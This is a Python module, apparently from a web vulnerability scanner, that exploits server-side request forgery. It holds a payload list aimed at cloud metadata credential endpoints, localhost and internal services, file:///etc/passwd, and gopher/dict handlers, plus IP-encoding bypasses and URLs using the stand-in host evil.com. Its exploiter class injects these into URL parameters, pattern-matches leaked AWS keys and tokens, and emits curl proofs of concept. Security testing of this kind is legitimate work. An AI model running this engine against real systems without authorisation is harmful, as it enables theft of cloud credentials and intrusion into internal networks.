"""
SSRF (Server-Side Request Forgery) Exploitation Module.
Tests for internal network access and cloud metadata exploitation.
"""
import re
import logging
import socket
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
import requests
from dataclasses import dataclass

logger = logging.getLogger(__name__)

# SSRF payloads targeting internal services and cloud metadata
SSRF_PAYLOADS = {
    # Localhost variants
    'localhost': [
        'http://127.0.0.1/',
        'http://localhost/',
        'http://127.0.0.1:80/',
        'http://127.0.0.1:8080/',
        'http://127.0.0.1:443/',
        'http://127.0.0.1:22/',
        'http://127.0.0.1:3306/',
        'http://127.0.0.1:6379/',
        'http://0.0.0.0/',
        'http://[::1]/',
        'http://0/',
        'http://0x7f000001/',
        'http://2130706433/',  # Decimal for 127.0.0.1
    ],
    
    # AWS metadata
    'aws_metadata': [
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://169.254.169.254/latest/user-data',
        'http://169.254.169.254/latest/dynamic/instance-identity/document',
    ],
    
    # GCP metadata
    'gcp_metadata': [
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.169.254/computeMetadata/v1/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    ],
    
    # Azure metadata
    'azure_metadata': [
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'http://169.254.169.254/metadata/identity/oauth2/token',
    ],
    
    # Internal network scanning
    'internal': [
        'http://10.0.0.1/',
        'http://172.16.0.1/',
        'http://192.168.0.1/',
        'http://192.168.1.1/',
        'http://intranet/',
        'http://internal/',
        'http://admin/',
    ],
    
    # Protocol handlers
    'protocols': [
        'file:///etc/passwd',
        'dict://127.0.0.1:11211/stat',
        'gopher://127.0.0.1:6379/_INFO',
        'ftp://127.0.0.1/',
    ],
    
    # Bypass techniques
    'bypass': [
        'http://127.1/',
        'http://127.0.1/',
        'http://0177.0.0.1/',  # Octal
        'http://0x7f.0.0.1/',  # Hex
        'http://127.0.0.1.nip.io/',
        'http://localtest.me/',
        'http://127.0.0.1%23@evil.com/',
        'http://evil.com@127.0.0.1/',
    ],
}

# Indicators of successful SSRF
SSRF_INDICATORS = {
    'aws_metadata': [r'ami-id', r'instance-id', r'AccessKeyId', r'SecretAccessKey'],
    'gcp_metadata': [r'project-id', r'zone', r'instance/name'],
    'azure_metadata': [r'subscriptionId', r'resourceGroup'],
    'internal_service': [r'redis_version', r'memcached', r'MongoDB'],
    'file_read': [r'root:.*:0:0:', r'\[extensions\]'],
    'localhost': [r'<title>|<!DOCTYPE|<html', r'Apache|nginx|IIS'],
}

@dataclass
class SSRFResult:
    url: str
    parameter: str
    payload: str
    target_accessed: str
    technique: str
    success: bool
    evidence: str
    data_leaked: bool = False
    method: str = 'GET'

class SSRFExploiter:
    """
    Advanced SSRF exploitation engine.
    Tests cloud metadata, internal services, and protocol handlers.
    """
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible)',
            'Metadata-Flavor': 'Google',  # For GCP
        })
        self.tested_count = 0
    
    def exploit(self, url: str) -> List[SSRFResult]:
        """Test for SSRF vulnerabilities."""
        results = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Target URL-like params
        if not params:
            params = {
                'url': ['http://example.com'], 
                'uri': ['http://example.com'],
                'path': ['/'],
                'dest': ['http://example.com'],
                'redirect': ['http://example.com'],
                'out': ['http://example.com'],
                'callback': ['http://example.com'],
                'next': ['/'],
                'data': ['http://example.com'],
                'reference': ['http://example.com'],
                'site': ['http://example.com'],
                'html': ['http://example.com'],
                'val': ['http://example.com'],
                'fetch': ['http://example.com'],
            }
        
        for param_name in params:
            logger.info(f"Testing SSRF in: {param_name}")
            
            # Test each category
            for category, payloads in SSRF_PAYLOADS.items():
                for payload in payloads[:4]:
                    result = self._test_ssrf(url, param_name, payload, category, params)
                    if result:
                        results.append(result)
                        break
        
        logger.info(f"SSRF scan: {len(results)} vulns, {self.tested_count} tests")
        return results
    
    def _test_ssrf(self, url: str, param: str, payload: str, category: str, params: dict) -> Optional[SSRFResult]:
        """Test single SSRF payload."""
        test_url = self._build_url(url, param, payload, params)
        
        try:
            # Add headers needed for cloud metadata
            headers = dict(self.session.headers)
            if 'gcp' in category:
                headers['Metadata-Flavor'] = 'Google'
            
            response = self.session.get(test_url, timeout=self.timeout, headers=headers)
            self.tested_count += 1
            
            # Check for SSRF indicators
            evidence, data_leaked = self._check_ssrf_success(response.text, category)
            if evidence:
                logger.warning(f"SSRF found: {param} -> {category}")
                return SSRFResult(
                    url=test_url,
                    parameter=param,
                    payload=payload,
                    target_accessed=category,
                    technique=category,
                    success=True,
                    evidence=evidence[:500],
                    data_leaked=data_leaked,
                )
        except requests.Timeout:
            # Timeout might indicate internal port is open but slow
            pass
        except Exception as e:
            logger.debug(f"SSRF test error: {e}")
        
        return None
    
    def _build_url(self, url: str, param: str, payload: str, params: dict) -> str:
        parsed = urlparse(url)
        test_params = {k: v[:] for k, v in params.items()}
        test_params[param] = [payload]
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            '', urlencode(test_params, doseq=True), ''
        ))
    
    def _check_ssrf_success(self, html: str, category: str) -> tuple[Optional[str], bool]:
        """Check if response indicates successful SSRF."""
        data_leaked = False
        
        # Check category-specific indicators
        indicators = SSRF_INDICATORS.get(category, SSRF_INDICATORS.get('localhost', []))
        for pattern in indicators:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                data_leaked = category in ['aws_metadata', 'gcp_metadata', 'azure_metadata']
                start = max(0, match.start() - 30)
                end = min(len(html), match.end() + 100)
                return html[start:end], data_leaked
        
        # Check for general internal response indicators
        if len(html) > 100:
            # Response from internal service
            internal_patterns = [
                r'<title>.*</title>',
                r'redis_version',
                r'Welcome to nginx',
                r'Apache',
            ]
            for pattern in internal_patterns:
                if re.search(pattern, html, re.IGNORECASE):
                    return html[:200], False
        
        return None, False


def run_ssrf_exploitation(url: str) -> List[Dict[str, Any]]:
    """Run SSRF exploitation."""
    exploiter = SSRFExploiter()
    results = exploiter.exploit(url)
    
    findings = []
    for result in results:
        severity = 'CRITICAL' if result.data_leaked or 'metadata' in result.technique else 'HIGH'
        
        impact = f'Server-side request forgery to {result.target_accessed}.'
        if result.data_leaked:
            impact += ' Cloud credentials may be leaked!'
        
        findings.append({
            'issue': f'Server-Side Request Forgery (SSRF)',
            'severity': severity,
            'category': 'ssrf',
            'impact': impact,
            'description': f'SSRF via "{result.parameter}". Internal resource "{result.target_accessed}" accessed.',
            'recommendation': 'Validate and sanitize all URL inputs. Use allowlists for permitted domains. Block requests to internal IP ranges and cloud metadata endpoints.',
            'affected_element': f'GET {result.parameter}',
            'score_impact': 35 if severity == 'CRITICAL' else 25,
            'evidence': result.evidence[:500],
            'poc': f'''# SSRF Proof of Concept
curl "{result.url}"
# Target: {result.target_accessed}
# Data leaked: {result.data_leaked}
''',
            'confidence': 'HIGH',
        })
    
    return findings
